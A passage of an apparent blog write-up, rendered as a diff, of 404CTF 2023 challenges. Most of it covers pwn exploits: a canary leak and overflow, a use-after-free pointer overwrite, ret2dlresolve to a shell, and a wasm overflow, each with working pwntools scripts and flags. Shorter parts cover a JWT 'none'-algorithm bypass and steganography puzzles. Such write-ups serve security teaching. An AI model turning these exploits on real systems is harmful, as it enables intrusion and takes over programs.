+<span class="s1">&#39;&#39;&#39;
+</span><span class="s1">payload = buffer + canary + ebp + eip
+</span><span class="s1">We can break on the value bellow in GDB to check the stack value
+</span><span class="s1">b* 0x0000000000400a39
+</span><span class="s1">&#39;&#39;&#39;</span>
+
+<span class="n">addr</span> <span class="o">=</span> <span class="s2">&#34;challenges.404ctf.fr&#34;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">30223</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;%p&#34;</span><span class="o">*</span><span class="mi">17</span><span class="p">)</span> <span class="c1"># leak canary</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())[</span><span class="o">-</span><span class="mi">21</span><span class="p">:]</span>
+<span class="n">leaked_canary</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Leaked canary value&#34;</span><span class="p">,</span> <span class="n">leaked_canary</span><span class="p">)</span>
+
+<span class="n">flag_fct</span> <span class="o">=</span> <span class="mi">4196471</span> <span class="c1"># elf.symbols[&#39;canary&#39;]</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Leaked canary function &#34;</span><span class="p">,</span> <span class="n">flag_fct</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">72</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leaked_canary</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_fct</span><span class="p">)</span><span class="c1"># return here</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;[Vous] :&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><p>We execute our exploit and we get the flag!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="err">$</span> <span class="n">python3</span> <span class="n">canary</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">challenges</span><span class="mf">.404</span><span class="n">ctf</span><span class="o">.</span><span class="n">fr</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">30223</span><span class="p">:</span> <span class="n">Done</span>
+<span class="n">Leaked</span> <span class="n">canary</span> <span class="n">value</span> <span class="mh">0x4f70c3267c091900</span>
+<span class="n">Leaked</span> <span class="n">canary</span> <span class="n">function</span>  <span class="mi">4196471</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+<span class="p">[</span><span class="n">Francis</span><span class="p">]</span> <span class="p">:</span> <span class="n">Je</span> <span class="n">vous</span> <span class="n">laisse</span> <span class="n">mettre</span> <span class="n">votre</span> <span class="n">plan</span> <span class="n">à</span> <span class="n">éxécution</span><span class="o">.</span>
+<span class="n">Que</span> <span class="n">faites</span><span class="o">-</span><span class="n">vous</span> <span class="err">?</span>
+<span class="mi">1</span> <span class="p">:</span> <span class="n">Aller</span> <span class="n">voir</span> <span class="n">Francis</span>
+<span class="mi">2</span> <span class="p">:</span> <span class="n">Réfléchir</span> <span class="n">à</span> <span class="n">un</span> <span class="n">moyen</span> <span class="n">de</span> <span class="n">capturer</span> <span class="n">le</span> <span class="n">canari</span>
+<span class="mi">3</span> <span class="p">:</span> <span class="n">Vaquer</span> <span class="n">à</span> <span class="n">vos</span> <span class="n">occupations</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="err">$</span> <span class="mi">3</span>
+<span class="n">Je</span> <span class="n">vous</span> <span class="n">suis</span> <span class="n">infiniment</span> <span class="n">reconnaissant</span> <span class="n">d</span><span class="s1">&#39;avoir retrouvé mon canari.</span>
+<span class="mi">404</span><span class="n">CTF</span><span class="p">{</span><span class="mi">135</span><span class="n">_C4N4r15_41M3N7_14_C0MP46N13_N3_135_141553Z_P45_53U15</span><span class="p">}</span>
+</code></pre></div><h2 id="lalchimiste">L’alchimiste<a hidden class="anchor" aria-hidden="true" href="#lalchimiste">#</a></h2>
+<p>Let’s perform a <code>checksec</code> on the binary:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="err">$</span> <span class="n">checksec</span> <span class="o">./</span><span class="n">l_alchimiste</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;./l_alchimiste&#39;</span>
+    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
+    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
+    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+    <span class="o">**</span><span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="o">**</span>
+</code></pre></div><p>Again, a canary and no PIE.</p>
+<p>At launch, we have 50 INT, 100 FO and 100 OR. We can buy a potion with 50 OR and it increase our FO by 10, but it is not enough: <strong>we need 150 FO and 150 INT to get the flag</strong> (option 5).</p>
+<p>Playing a little bit with GDB, we can use <code>vis_heap_chunks to check</code> to display the heap chunks. We can quickly identify that there is a use after free vulnerability (UAF) because if we buy a potion and that we use it, the pointer is not set to null after the call to <code>free()</code>. Therefore, the content allocated in the heap with option 3 will take place in Potion structure (they have the same size). The Potion structure contains the function <code>incStr</code> adress that allow the player to increase its FO.</p>
+<p><img loading="lazy" src="/404CTF2023_data/1.png" alt="Untitled"  />
+</p>
+<p><img loading="lazy" src="/404CTF2023_data/2.png" alt="Untitled"  />
+</p>
+<p>We can confirm it because Option 1,2,3 gives us the adress of the data in the heap:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="o">...</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span>
+<span class="o">*****</span> <span class="n">Achat</span> <span class="n">d</span><span class="s1">&#39;un élixir de force</span>
+<span class="o">*******</span> <span class="o">~</span> <span class="mh">0x6036d0</span><span class="o">**</span>
+<span class="o">...</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="mi">2</span>
+<span class="o">*****</span> <span class="n">Elixir</span> <span class="n">consommé</span>
+<span class="o">*****</span> <span class="n">Vous</span> <span class="n">sentez</span> <span class="n">votre</span> <span class="n">force</span> <span class="n">augmenter</span><span class="o">.</span>
+<span class="o">*******</span> <span class="o">~</span> <span class="mh">0x6036d0</span><span class="o">**</span>
+<span class="o">...</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="mi">3</span>
+<span class="p">[</span><span class="n">Vous</span><span class="p">]</span> <span class="p">:</span> <span class="n">whatever</span> <span class="n">lol</span>
+<span class="o">*******</span> <span class="o">~</span> <span class="mh">0x6036d0</span>
+						<span class="o">^</span>
+						<span class="o">|</span>
+						<span class="n">UAF</span><span class="o">**</span>
+</code></pre></div><p>Using this vulnerability, we can quickly see that we just need to use the option 3 to allocate random data into the heap, then the function 2 will work because of the UAF vulnerability. So we can increase our FOR for free.</p>
+<p>But how do we increase our INT?</p>
+<p>If we look at the code in Ghidra, we can see that there is a function <code>incInt()</code> which is never used. This function could allow us to increase our INT, but to achieve that, we need to overwrite the previous function pointer in the Potion structure.</p>
+<p>So, we need to:</p>
+<ul>
+<li>Buy a potion (1) and use it (2)</li>
+<li>Speak (3) and input random data (even an empty buffer) to trigger the UAF, and then use (2) to increase FO. We can repeat this 10 time for example.</li>
+<li>Create a custom buffer with 64 random bytes + the <code>incInt</code> function adress (we can get it with pwntools)</li>
+<li>Speak (3) and use our custom buffer as input, and then use (2) to increase INT</li>
+<li>(Optionnal) Check our stats (4)</li>
+<li>Get the flag with (5)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">addr</span> <span class="o">=</span> <span class="s2">&#34;challenges.404ctf.fr&#34;</span> 
+<span class="n">port</span> <span class="o">=</span> <span class="mi">30944</span> 
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="c1">#elf = ELF(&#34;./l_alchimiste&#34;)</span>
+
+<span class="c1"># Buy our only leggit potion to trigger the UAF</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+
+<span class="c1"># Increase FO</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;[Vous] :&#34;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+
+<span class="c1"># Increase INT by overwriting function pointer in our UAF vulnerability</span>
+<span class="n">create_potion</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">64</span>
+<span class="n">create_potion</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">4196565</span><span class="p">)</span> <span class="c1">#elf.symbols[&#39;incInt&#39;]</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;[Vous] :&#34;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">create_potion</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1"># Type 4 and get the flag</span>
+</code></pre></div><p>We can then execute our script and get the flag:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ python3 pwned.py
+<span class="o">[</span>+<span class="o">]</span> Opening connection to challenges.404ctf.fr on port 30944: Done
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+
+***** Elixir consommé
+***** Vous sentez votre force augmenter.
+***** ~ 0x14ec290
+
+1: Acheter un élixir de force
+2: Consommer un élixir de force
+3: Parler à l<span class="se">\&#39;</span>alchimiste
+4: Montrer mes caractéristiques
+5: Obtenir la clé
+6: Sortir du cabinet d<span class="se">\&#39;</span>alchimie
+&gt;&gt;&gt; $ <span class="m">4</span>
+Voici une estimation numérique de vos caractéristiques:
+    FOR: <span class="m">310</span>
+    INT: <span class="m">250</span>
+    OR: <span class="m">50</span>
+1: Acheter un élixir de force
+2: Consommer un élixir de force
+3: Parler à l<span class="se">\&#39;</span>alchimiste
+4: Montrer mes caractéristiques
+5: Obtenir la clé
+6: Sortir du cabinet d<span class="err">&#39;</span>alchimie
+&gt;&gt;&gt; $ <span class="m">5</span>
+<span class="o">[</span>Alchimiste<span class="o">]</span> : Voici la clé de la connaissance, comme promis.
+-----------------------------------------------
+404CTF<span class="o">{</span>P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7<span class="o">}</span>
+-----------------------------------------------
+</code></pre></div><h2 id="la-feuille-blanche">La feuille blanche<a hidden class="anchor" aria-hidden="true" href="#la-feuille-blanche">#</a></h2>
+<p>We were given this binary:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="nx">$</span> <span class="nx">checksec</span> <span class="p">.</span><span class="o">/</span><span class="nx">la_feuille_blanche</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;la_feuille_blanche&#39;</span>
+    <span class="nx">Arch</span><span class="o">:</span>     <span class="nx">i386</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="nx">little</span>
+    <span class="nx">RELRO</span><span class="o">:</span>    <span class="nx">Partial</span> <span class="nx">RELRO</span>
+    <span class="nx">Stack</span><span class="o">:</span>    <span class="nx">No</span> <span class="nx">canary</span> <span class="nx">found</span>
+    <span class="nx">NX</span><span class="o">:</span>       <span class="nx">NX</span> <span class="nx">enabled</span>
+    <span class="nx">PIE</span><span class="o">:</span>      <span class="nx">No</span> <span class="nx">PIE</span> <span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>
+</code></pre></div><p>We can see that there is no canary and no PIE. If we execute the program, we can input something, then the message end. If we input a big message, then we have a <code>Segmentation fault</code>.</p>
+<p>Looking at the code in Ghidra, here is the only interresting code (the program is pretty much empty, no magic function for us!). We can see a buffer overflow because <code>read()</code> is reading more bytes than the buffer capacity:</p>
+<p><img loading="lazy" src="/404CTF2023_data/3.png" alt="Untitled"  />
+</p>
+<p>So, it’s a buffer overflow. We can execute it locally a do a basic <code>ret2libc</code>by getting the adresses in GDB, but the problem is that the remote library has different ones: we need another way.
+We could think of a ROP chain to leak the base adress, but again, the function is not printing anything… So at this point, I was a bit out of idea.</p>
+<p>Looking around on the internet, we can find this <a href="https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve">blogpost</a>, speaking <code>ret2dlresolve</code>.</p>
+<p>We can find the offset to trigger the BoF:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="nx">$</span> <span class="nx">cyclic</span> <span class="o">-</span><span class="nx">n</span> <span class="mi">4</span> <span class="mi">70</span> <span class="o">|</span> <span class="p">.</span><span class="o">/</span><span class="nx">la_feuille_blanche</span>
+<span class="nx">Segmentation</span> <span class="nx">fault</span>
+<span class="nx">$</span> <span class="nx">sudo</span> <span class="nx">dmesg</span> <span class="o">|</span> <span class="nx">tail</span> <span class="o">-</span><span class="nx">n</span> <span class="mi">10</span>
+<span class="p">[</span><span class="mf">26222.310779</span><span class="p">]</span> <span class="nx">CPU</span><span class="o">:</span> <span class="mi">6</span> <span class="nx">PID</span><span class="o">:</span> <span class="mi">12461</span> <span class="nx">Comm</span><span class="o">:</span> <span class="nx">la_feuille_blan</span> <span class="nx">Not</span> <span class="nx">tainted</span> <span class="mf">5.15.90.1</span><span class="o">-</span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">standard</span><span class="o">-</span><span class="nx">WSL2</span> <span class="err">#</span><span class="mi">1</span>
+<span class="p">[</span><span class="mf">26222.311089</span><span class="p">]</span> <span class="nx">RIP</span><span class="o">:</span> <span class="mi">0023</span><span class="o">:</span><span class="mh">0x61616169</span>
+<span class="nx">$</span> <span class="nx">cyclic</span> <span class="o">-</span><span class="nx">n</span> <span class="mi">4</span> <span class="o">-</span><span class="nx">l</span> <span class="mh">0x61616169</span>
+<span class="mi">32</span>
+</code></pre></div><p>And flag with pwntools:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="nx">from</span> <span class="nx">pwn</span> <span class="kr">import</span> <span class="o">*</span>
+
+<span class="nx">addr</span> <span class="o">=</span> <span class="s2">&#34;challenges.404ctf.fr&#34;</span>
+<span class="nx">port</span> <span class="o">=</span> <span class="mi">31822</span>
+<span class="nx">context</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="nx">remote</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span><span class="nx">port</span><span class="p">)</span>
+<span class="nx">e</span> <span class="o">=</span> <span class="nx">ELF</span><span class="p">(</span><span class="s1">&#39;./la_feuille_blanche&#39;</span><span class="p">)</span>
+<span class="nx">rop</span> <span class="o">=</span> <span class="nx">ROP</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
+<span class="nx">dlresolve</span> <span class="o">=</span> <span class="nx">Ret2dlresolvePayload</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">symbol</span><span class="o">=</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="nx">args</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">])</span>
+<span class="nx">rop</span><span class="p">.</span><span class="nx">raw</span><span class="p">(</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">32</span><span class="p">)</span>
+<span class="nx">rop</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">dlresolve</span><span class="p">.</span><span class="nx">data_addr</span><span class="p">)</span>
+<span class="nx">rop</span><span class="p">.</span><span class="nx">ret2dlresolve</span><span class="p">(</span><span class="nx">dlresolve</span><span class="p">)</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">sendline</span><span class="p">(</span><span class="nx">rop</span><span class="p">.</span><span class="nx">chain</span><span class="p">())</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">sendline</span><span class="p">(</span><span class="nx">dlresolve</span><span class="p">.</span><span class="nx">payload</span><span class="p">)</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">interactive</span><span class="p">()</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="nx">$</span> <span class="nx">python3</span> <span class="nx">exploit</span><span class="p">.</span><span class="nx">py</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Opening</span> <span class="nx">connection</span> <span class="nx">to</span> <span class="nx">challenges</span><span class="mf">.404</span><span class="nx">ctf</span><span class="p">.</span><span class="nx">fr</span> <span class="nx">on</span> <span class="nx">port</span> <span class="mi">31822</span><span class="o">:</span> <span class="nx">Done</span>
+    <span class="nx">Arch</span><span class="o">:</span>     <span class="nx">i386</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="nx">little</span>
+    <span class="nx">RELRO</span><span class="o">:</span>    <span class="nx">Partial</span> <span class="nx">RELRO</span>
+    <span class="nx">Stack</span><span class="o">:</span>    <span class="nx">No</span> <span class="nx">canary</span> <span class="nx">found</span>
+    <span class="nx">NX</span><span class="o">:</span>       <span class="nx">NX</span> <span class="nx">enabled</span>
+    <span class="nx">PIE</span><span class="o">:</span>      <span class="nx">No</span> <span class="nx">PIE</span> <span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Loaded</span> <span class="mi">10</span> <span class="nx">cached</span> <span class="nx">gadgets</span> <span class="k">for</span> <span class="s1">&#39;./la_feuille_blanche&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Switching</span> <span class="nx">to</span> <span class="nx">interactive</span> <span class="nx">mode</span>
+<span class="nx">$</span> <span class="nx">ls</span>
+<span class="nx">flag</span><span class="p">.</span><span class="nx">txt</span>
+<span class="nx">la_feuille_blanche</span>
+<span class="nx">$</span> <span class="nx">cat</span> <span class="nx">flag</span><span class="p">.</span><span class="nx">txt</span>
+<span class="mi">404</span><span class="nx">CTF</span><span class="p">{</span><span class="mi">3</span><span class="nx">MM4_80V4rY_357_UN3_F3MM3_C0MP11QU33_M415_V0U5_4V3Z_r3U551_4_14_C0N5013r_3N_1U1_F4154N7_M1r0173r_C3_QU3113_V0U1417</span><span class="p">}</span>
+</code></pre></div><h2 id="un-tour-de-magie">Un tour de magie<a hidden class="anchor" aria-hidden="true" href="#un-tour-de-magie">#</a></h2>
+<p>We have this binary:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ nc challenges.404ctf.fr <span class="m">30274</span>
+11a20Alors, t<span class="err">&#39;</span>es un magicien ?
+Nop
+Apparemment non...
+</code></pre></div><p>We can write 24 bytes, then write the 4 bytes given at the beginning (otherwise we will have an error from wasm), then we write the bytes needed to get the flag.</p>
+<p><img loading="lazy" src="/404CTF2023_data/4.png" alt="Untitled"  />
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">addr</span> <span class="o">=</span> <span class="s2">&#34;challenges.404ctf.fr&#34;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">30274</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;magicien ?&#34;</span><span class="p">)</span>
+<span class="n">base_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">24</span>  <span class="c1"># size = 24</span>
+<span class="n">base_payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x11a20</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x50bada55</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">base_payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><h1 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h1>
+<h2 id="lacadémie-du-détail">L&rsquo;Académie du détail<a hidden class="anchor" aria-hidden="true" href="#lacadémie-du-détail">#</a></h2>
+<p>We had a website with nothing but a landing page and an authentication page. We can auth as any user if he does not exist, but admin does. A JWT is set with the username in it, and being logged in gives us a new page, <code>/members</code>, but we cannot view its content since we are not admin. But if we set the JWT signing algorithm to <code>null</code> and change value of username to <code>admin</code>, then we can access <code>/members</code> : we have a picture and a name (but nothing really interesting at first).</p>
+<p><img loading="lazy" src="/404CTF2023_data/5.png" alt="Untitled"  />
+</p>
+<p>If we upload the image on aperisolve, we can spot LSB in the upper left corner:</p>
+<p><img loading="lazy" src="/404CTF2023_data/6.png" alt="Untitled"  />
+</p>
+<p>We can get the flag using stegonline:</p>
+<p><img loading="lazy" src="/404CTF2023_data/7.png" alt="Untitled"  />
+</p>
+<h2 id="fuite-en-1791">Fuite en 1791<a hidden class="anchor" aria-hidden="true" href="#fuite-en-1791">#</a></h2>
+<p>A bit random, but we need to provire an expiration date with a valid signature. The original one has a valid signature but the timestamp is not valid anymore. What if we try to use it, but then we add another expiry date?</p>
+<p><img loading="lazy" src="/404CTF2023_data/8.png" alt="Untitled"  />
+</p>
+<h1 id="steganography">Steganography<a hidden class="anchor" aria-hidden="true" href="#steganography">#</a></h1>
+<h2 id="odobenus-rosmarus">Odobenus Rosmarus<a hidden class="anchor" aria-hidden="true" href="#odobenus-rosmarus">#</a></h2>
+<p>We were given a text. It look like Acrostiches, but nothing comes out from when you try to decode it the regular way. Since the name of the challenge is <strong><strong>Odobenus Rosmarus (== morse) ,</strong></strong> we can guess that we have  <strong>C == Court == short</strong>, <strong>L == Long, and E == Espace == space</strong>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="nx">coded</span><span class="o">=</span> <span class="s2">&#34;Ce soir je Célèbre Le Concert Electro Comme Louis Et Lou. Comme La nuit Commence Et Continue Clairement, Et Clignote Lascivement il Chasse sans Chausser En Clapant Encore Classiquement Les Cerclages du Clergé. Encore Car Encore, Louis Lou Entamant Longuement La Lullabile En Commençant Le Cercle Exhaltant de Club Comique Cannais Et Clermontois.&#34;</span>
+<span class="nx">extract</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+<span class="k">for</span> <span class="nx">i</span> <span class="k">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">len</span><span class="p">(</span><span class="nx">test</span><span class="p">))</span><span class="o">:</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">test</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;C&#34;</span><span class="p">)</span><span class="o">:</span>
+        <span class="nx">extract</span> <span class="o">+=</span> <span class="s2">&#34;.&#34;</span>
+    <span class="nx">elif</span><span class="p">(</span><span class="nx">test</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;L&#34;</span><span class="p">)</span><span class="o">:</span>
+        <span class="nx">extract</span> <span class="o">+=</span> <span class="s2">&#34;_&#34;</span>
+    <span class="nx">elif</span><span class="p">(</span><span class="nx">test</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;E&#34;</span><span class="p">)</span><span class="o">:</span>
+        <span class="nx">extract</span> <span class="o">+=</span> <span class="s2">&#34; &#34;</span>
+<span class="nx">print</span><span class="p">(</span><span class="nx">extract</span><span class="p">)</span>
+</code></pre></div><p>Which gives us:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="p">..</span><span class="nx">_</span><span class="p">.</span> <span class="p">.</span><span class="nx">_</span> <span class="nx">_</span><span class="p">.</span><span class="nx">_</span><span class="p">.</span> <span class="p">..</span> <span class="p">.</span><span class="nx">_</span><span class="p">..</span> <span class="p">.</span> <span class="p">.</span><span class="nx">_</span><span class="p">..</span> <span class="p">.</span> <span class="nx">__</span> <span class="nx">___</span> <span class="p">.</span><span class="nx">_</span><span class="p">.</span> <span class="p">...</span> <span class="p">.</span>
+</code></pre></div><p><img loading="lazy" src="/404CTF2023_data/9.png" alt="Untitled"  />
+</p>
+<p>The flag is <code>404CTF{FACILELEMORSE}</code></p>
+<h2 id="lœuvre">L&rsquo;Œuvre<a hidden class="anchor" aria-hidden="true" href="#lœuvre">#</a></h2>
+<p>Were were given this image:</p>
+<p><img loading="lazy" src="/404CTF2023_data/10.png" alt="Untitled"  />
+</p>
+<p>In the challenge description, they say that “there is colour variation”. Using aperisolve, we can get the flag:</p>
